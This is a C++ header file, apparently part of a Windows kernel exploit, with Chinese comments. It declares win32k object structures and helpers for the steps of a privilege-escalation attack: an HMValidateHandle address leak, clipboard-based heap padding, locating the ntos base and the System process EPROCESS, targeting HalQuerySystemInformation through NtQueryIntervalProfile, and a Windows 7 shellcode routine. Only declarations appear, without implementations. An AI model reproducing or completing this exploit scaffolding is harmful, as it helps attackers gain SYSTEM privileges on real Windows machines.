#pragma once
#include <cstdio>
#include <windows.h>
#include <Psapi.h>
#pragma comment(linker, "/defaultlib:Psapi.lib")

#define PAGE_SIZE 0x1000
#define TYPE_WINDOW 1

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

typedef struct _HEAD
{
	HANDLE h;
	DWORD clockObj;
}HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
}THROBJHEAD, *PTHROBJHEAD;

typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID rpdesk;
	PVOID pSelf;
}THRDESKHEAD, *PTHRDESKHEAD;

typedef void*(NTAPI *lHMValidateHandle)(HANDLE h, int type);
typedef NTSTATUS(WINAPI* lpfnNtQueryIntervalProfile)(IN DWORD Src, IN OUT PDWORD Profile);

EXTERN_C_START
NTSTATUS ShellCodeInWin7();
EXTERN_C_END

VOID ShowError(char *str, DWORD dwErrorCode);			// 打印错误信息
ULONG64 GetNTBase();									// 获取ntos基址
ULONG64 GetSystemProcess();								// 获取System进程EPROCESS
BOOL CreateClipboard(DWORD dwSize);						// 通过剪切板实现垫片操作,dwSize + 0x14 + 0x10的内存块
PVOID GetHMValidateHandle();							// 获取HMValidateHandle函数地址
PVOID GetHalQuerySystemInformation();					// 获取HalQuerySystemInformation函数地址
BOOL CallNtQueryIntervalProfile();						// 调用NtQueryIntervalProfile函数